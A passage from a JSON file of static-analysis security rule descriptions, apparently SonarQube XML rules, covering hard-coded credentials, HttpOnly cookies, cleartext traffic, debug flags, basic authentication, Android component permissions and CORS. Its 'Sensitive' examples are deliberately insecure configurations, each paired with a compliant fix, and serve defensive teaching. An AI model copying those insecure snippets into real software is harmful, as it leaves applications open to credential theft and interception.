<a\n  href=\"https://www.red-gate.com/simple-talk/development/dotnet-development/whats-new-in-code-access-security-in-net-framework-4-0-part-i/\">What’s New\n  in Code Access Security in .NET Framework 4.0 – Part I</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "xml:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://docs.spring.io/spring-social-twitter/docs/1.1.0.RELEASE/reference/htmlsingle/\">Spring-social-twitter</a> secrets can be stored\ninside a xml file:</p>\n<pre>\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"\n        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;\n\n    &lt;bean id=\"connectionFactoryLocator\" class=\"org.springframework.social.connect.support.ConnectionFactoryRegistry\"&gt;\n      &lt;property name=\"connectionFactories\"&gt;\n          &lt;list&gt;\n              &lt;bean class=\"org.springframework.social.twitter.connect.TwitterConnectionFactory\"&gt;\n                  &lt;constructor-arg value=\"username\" /&gt;\n                  &lt;constructor-arg value=\"very-secret-password\" /&gt;   &lt;!-- Sensitive --&gt;\n              &lt;/bean&gt;\n          &lt;/list&gt;\n      &lt;/property&gt;\n  &lt;/bean&gt;\n&lt;/beans&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>In <a href=\"https://docs.spring.io/spring-social-twitter/docs/1.1.0.RELEASE/reference/htmlsingle/\">spring social twitter</a>, retrieve secrets from\nenvironment variables:</p>\n<pre>\n@Configuration\npublic class SocialConfig implements SocialConfigurer {\n\n    @Override\n    public void addConnectionFactories(ConnectionFactoryConfigurer cfConfig, Environment env) {\n        cfConfig.addConnectionFactory(new TwitterConnectionFactory(\n            env.getProperty(\"twitter.consumerKey\"),\n            env.getProperty(\"twitter.consumerSecret\")));  &lt;!-- Compliant --&gt;\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "xml:S3330": {
        "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n&lt;session-config&gt;\n &lt;cookie-config&gt;\n  &lt;http-only&gt;false&lt;/http-only&gt; &lt;!-- Sensitive --&gt;\n &lt;/cookie-config&gt;\n&lt;/session-config&gt;\n\n&lt;session-config&gt;\n &lt;cookie-config&gt; &lt;!-- Sensitive: http-only tag is missing defaulting to false --&gt;\n &lt;/cookie-config&gt;\n&lt;/session-config&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;session-config&gt;\n &lt;cookie-config&gt;\n  &lt;http-only&gt;true&lt;/http-only&gt; &lt;!-- Compliant --&gt;\n &lt;/cookie-config&gt;\n&lt;/session-config&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">OWASP Top 10 2017 Category A7</a> - Cross-Site\n  Scripting (XSS) </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/1004\">MITRE, CWE-1004</a> - Sensitive Cookie Without 'HttpOnly' Flag </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "xml:S3355": {
        "name": "Defined filters should be used",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not\ninvoked.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n  &lt;filter&gt;\n     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;\n     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;\n  &lt;/filter&gt;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n  &lt;filter&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;\n  &lt;/filter&gt;\n\n  &lt;filter-mapping&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n  &lt;/filter-mapping&gt;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "xml:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n&lt;application\n    android:usesCleartextTraffic=\"true\"&gt; &lt;!-- Sensitive --&gt;\n&lt;/application&gt;\n</pre>\n<p>For versions older than Android 9 (API level 28) <code>android:usesCleartextTraffic</code> is implicitely set to <code>true</code>.</p>\n<pre>\n&lt;application&gt; &lt;!-- Sensitive --&gt;\n&lt;/application&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;application\n    android:usesCleartextTraffic=\"false\"&gt;\n&lt;/application&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec Verification\n  Standard</a> - Network Communication Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">OWASP Mobile Top 10 2016 Category M3</a> - Insecure\n  Communication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/200\">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/319\">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "xml:S2647": {
        "name": "Basic authentication should not be used",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Basic authentication’s only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the\nthinnest veil of protection to your users, and should not be used.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// in web.xml\n&lt;web-app  ...&gt;\n  &lt;!--  ...  --&gt;\n  &lt;login-config&gt;\n    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;\n  &lt;/login-config&gt;\n&lt;/web-app&gt;\n</pre>\n<h3>Exceptions</h3>\n<p>The rule will not raise any issue if HTTPS is enabled, on any URL-pattern.</p>\n<pre>\n&lt;web-app  ...&gt;\n  &lt;!--  ...  --&gt;\n  &lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n      &lt;web-resource-name&gt;HTTPS enabled&lt;/web-resource-name&gt;\n      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n    &lt;user-data-constraint&gt;\n      &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;\n    &lt;/user-data-constraint&gt;\n  &lt;/security-constraint&gt;\n&lt;/web-app&gt;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication\">OWASP Web Service Security\n  Cheat Sheet</a> </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/522\">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "xml:S3374": {
        "name": "Struts validation forms should have unique names",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>According to the Common Weakness Enumeration,</p>\n<blockquote>\n  <p>If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards\n  the other. This decision might not correspond to the programmer’s expectations…​</p>\n</blockquote>\n<p>In such a case, it is likely that the two forms should be combined. At the very least, one should be removed.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n&lt;form-validation&gt;\n  &lt;formset&gt;\n    &lt;form name=\"BookForm\"&gt; ... &lt;/form&gt;\n    &lt;form name=\"BookForm\"&gt; ... &lt;/form&gt;  &lt;!-- Noncompliant --&gt;\n  &lt;/formset&gt;\n&lt;/form-validation&gt;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n&lt;form-validation&gt;\n  &lt;formset&gt;\n    &lt;form name=\"BookForm\"&gt; ... &lt;/form&gt;\n  &lt;/formset&gt;\n&lt;/form-validation&gt;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/102\">MITRE, CWE-102</a> - Struts: Duplicate Validation Forms </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation\">OWASP, Improper Data Validation</a> - Struts: Duplicate\n  Validation Forms </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "xml:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production.</p>\n<p>Activating a development feature in production can have an important range of consequences depending on its use:</p>\n<ul>\n  <li> Technical information leak; generally by disclosing verbose logging information to the application’s user. </li>\n  <li> Arbitrary code execution; generally with a parameter that will allow the remote debugging or profiling of the application. </li>\n</ul>\n<p>In all cases, the attack surface of an affected application is increased. In some cases, such features can also make the exploitation of other\nunrelated vulnerabilities easier.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The development of the app is completed and the development feature is activated. </li>\n  <li> The app is distributed to end users with the `development feature activated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Applications should be released without any development feature activated. When such features are required when in the development process of the\napplication, they should only apply to a build variant that is dedicated to development environments. That variant should not be set as the default\nbuild configuration to prevent any unattended development feature exposition.</p>\n<h2>Sensitive Code Example</h2>\n<p>In <code>AndroidManifest.xml</code> the android debuggable property is set to <code>true</code>. The application will therefore be debuggable.</p>\n<pre>\n&lt;application\n  android:icon=\"@mipmap/ic_launcher\"\n  android:label=\"@string/app_name\"\n  android:roundIcon=\"@mipmap/ic_launcher_round\"\n  android:supportsRtl=\"true\"\n  android:debuggable=\"true\"\n  android:theme=\"@style/AppTheme\"&gt;\n&lt;/application&gt;  &lt;!-- Sensitive --&gt;\n</pre>\n<p>In a <code>web.config</code> file, the <code>customErrors</code> element’s <code>mode</code> attribute is set to <code>Off</code>. The application\nwill disclose unnecessarily verbose information to its users upon error.</p>\n<pre>\n&lt;configuration&gt;\n  &lt;system.web&gt;\n    &lt;customErrors mode=\"Off\" /&gt; &lt;!-- Sensitive --&gt;\n  &lt;/system.web&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>In <code>AndroidManifest.xml</code> the android debuggable property is set to <code>false</code>:</p>\n<pre>\n&lt;application\n  android:icon=\"@mipmap/ic_launcher\"\n  android:label=\"@string/app_name\"\n  android:roundIcon=\"@mipmap/ic_launcher_round\"\n  android:supportsRtl=\"true\"\n  android:debuggable=\"false\"\n  android:theme=\"@style/AppTheme\"&gt;\n&lt;/application&gt; &lt;!-- Compliant --&gt;\n</pre>\n<p>In a <code>web.config</code> file, the <code>customErrors</code> element’s <code>mode</code> attribute is set to <code>On</code>:</p>\n<pre>\n&lt;configuration&gt;\n  &lt;system.web&gt;\n    &lt;customErrors mode=\"On\" /&gt; &lt;!-- Compliant --&gt;\n  &lt;/system.web&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x12-v7-code_quality_and_build_setting_requirements\">Mobile AppSec\n  Verification Standard</a> - Code Quality and Build Setting Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m10-extraneous-functionality\">OWASP Mobile Top 10 2016 Category M10</a> -\n  Extraneous Functionality </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/215\">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>\n  <li> <a href=\"https://developer.android.com/studio/publish/preparing\">developer.android.com</a> - Prepare for release </li>\n  <li> <a\n  href=\"https://learn.microsoft.com/en-us/aspnet/web-forms/overview/getting-started/getting-started-with-aspnet-45-web-forms/aspnet-error-handling\">learn.microsoft.com</a> - ASP.NET Error Handling </li>\n</ul>",
        "severity": "MINOR"
      },
      "xml:S5594": {
        "name": "Exported component access should be restricted with appropriate permissions",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Once an Android component has been exported, it can be used by attackers to launch malicious actions and might also give access to other components\nthat are not exported.</p>\n<p>As a result, sensitive user data can be stolen, and components can be launched unexpectedly.</p>\n<p>For this reason, the following components should be protected:</p>\n<ul>\n  <li> Providers </li>\n  <li> Activities </li>\n  <li> Activity-aliases </li>\n  <li> Services </li>\n</ul>\n<p>To do so, it is recommended to either set <code>exported</code> to <code>false</code>, add <code>android:readPermission</code> and\n<code>android:writePermission</code> attributes, or add a <code>&lt;permission&gt;</code> tag.</p>\n<p><strong>Warning</strong>: When targeting Android&nbsp;versions lower than 12, the presence of intent filters will cause <code>exported</code> to be\nset to <code>true</code> by default.</p>\n<p>If a component must be exported, use a <code>&lt;permission&gt;</code> tag and the <a\nhref=\"https://developer.android.com/guide/topics/manifest/permission-element#plevel\">protection level</a> that matches your use case and data\nconfidentiality requirements.<br> For example, <a href=\"https://developer.android.com/training/sync-adapters\">Sync adapters</a> should use a\n<code>signature</code> protection level to remain both exported <strong>and</strong> protected.</p>\n<h3>Noncompliant code example</h3>\n<p>The following components are vulnerable because permissions are undefined or partially defined:</p>\n<pre>\n&lt;provider\n  android:authorities=\"com.example.app.Provider\"\n  android:name=\"com.example.app.Provider\"\n  android:exported=\"true\"\n  android:readPermission=\"com.example.app.READ_PERMISSION\" /&gt;  &lt;!-- Noncompliant: write permission is not defined --&gt;\n</pre>\n<pre>\n&lt;provider\n  android:authorities=\"com.example.app.Provider\"\n  android:name=\"com.example.app.Provider\"\n  android:exported=\"true\"\n  android:writePermission=\"com.example.app.WRITE_PERMISSION\" /&gt;  &lt;!-- Noncompliant: read permission is not defined --&gt;\n</pre>\n<pre>\n&lt;activity android:name=\"com.example.activity.Activity\"&gt;  &lt;!-- Noncompliant: permissions are not defined --&gt;\n  &lt;intent-filter&gt;\n    &lt;action android:name=\"com.example.OPEN_UI\"/&gt;\n    &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt;\n  &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</pre>\n<h3>Compliant solution</h3>\n<p>If the component’s capabilities or data are not intended to be shared with other apps, its <code>exported</code> attribute should be set to\n<code>false</code>:</p>\n<pre>\n&lt;provider\n  android:authorities=\"com.example.app.Provider\"\n  android:name=\"com.example.app.Provider\"\n  android:exported=\"false\" /&gt;\n</pre>\n<p>Otherwise, implement permissions:</p>\n<pre>\n&lt;provider\n  android:authorities=\"com.example.app.Provider\"\n  android:name=\"com.example.app.Provider\"\n  android:exported=\"true\"\n  android:readPermission=\"com.example.app.READ_PERMISSION\"\n  android:writePermission=\"com.example.app.WRITE_PERMISSION\" /&gt;\n\n&lt;activity android:name=\"com.example.activity.Activity\"\n          android:permission=\"com.example.app.PERMISSION\" &gt;\n  &lt;intent-filter&gt;\n    &lt;action android:name=\"com.example.OPEN_UI\"/&gt;\n    &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n  &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions\">developer.android.com</a> - Implementing\n  content provider permissions </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec Verification\n  Standard</a> - Platform Interaction Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  platform usage </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">OWASP Mobile Top 10 2016 Category M2</a> - Insecure\n  Data Storage </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/926\">MITRE, CWE-926</a> - Improper Export of Android Application Components </li>\n</ul>",
        "severity": "MAJOR"
      },
      "xml:S6361": {
        "name": "Defining a single permission for read and write access of content providers is security-sensitive",
        "htmlDesc": "<p><code>android:permission</code> is used to set a single permission for both reading and writing data from a content provider. In regard to the\nPrinciple of Least Privilege, client applications that consume the content provider should only have the necessary privileges to complete their tasks.\nAs <code>android:permission</code> grants both read and write access, it prevents client applications from applying this principle. In practice, it\nmeans client applications that require read-only access will have to ask for more privileges than what they need: the content provider will always\ngrant read and write together.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some client applications consuming the content provider may only require read permission. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid using <code>android:permission</code> attribute alone. Instead <code>android:readPermission</code> and\n  <code>android:writePermission</code> attributes to define separate read and write permissions. </li>\n  <li> Avoid using the same permission for <code>android:readPermission</code> and <code>android:writePermission</code> attributes. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n&lt;provider\n  android:authorities=\"com.example.app.Provider\"\n  android:name=\"com.example.app.Provider\"\n  android:permission=\"com.example.app.PERMISSION\"  &lt;!-- Sensitive --&gt;\n  android:exported=\"true\"/&gt;\n</pre>\n<pre>\n&lt;provider\n  android:authorities=\"com.example.app.Provider\"\n  android:name=\"com.example.app.Provider\"\n  android:readPermission=\"com.example.app.PERMISSION\"  &lt;!-- Sensitive --&gt;\n  android:writePermission=\"com.example.app.PERMISSION\" &lt;!-- Sensitive --&gt;\n  android:exported=\"true\"/&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;provider\n  android:authorities=\"com.example.app.MyProvider\"\n  android:name=\"com.example.app.MyProvider\"\n  android:readPermission=\"com.example.app.READ_PERMISSION\"\n  android:writePermission=\"com.example.app.WRITE_PERMISSION\"\n  android:exported=\"true\"/&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions\">developer.android.com</a> - Implementing\n  content provider permissions </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec Verification\n  Standard</a> - Platform Interaction Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  platform usage </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m6-insecure-authorization\">OWASP Mobile Top 10 2016 Category M6</a> - Insecure\n  Authorization </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/1220\">MITRE, CWE-1220</a> - Insufficient Granularity of Access Control </li>\n</ul>",
        "severity": "MAJOR"
      },
      "xml:S5122": {
        "name": "Having a permissive Cross-Origin Resource Sharing policy is security-sensitive",
        "htmlDesc": "<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code 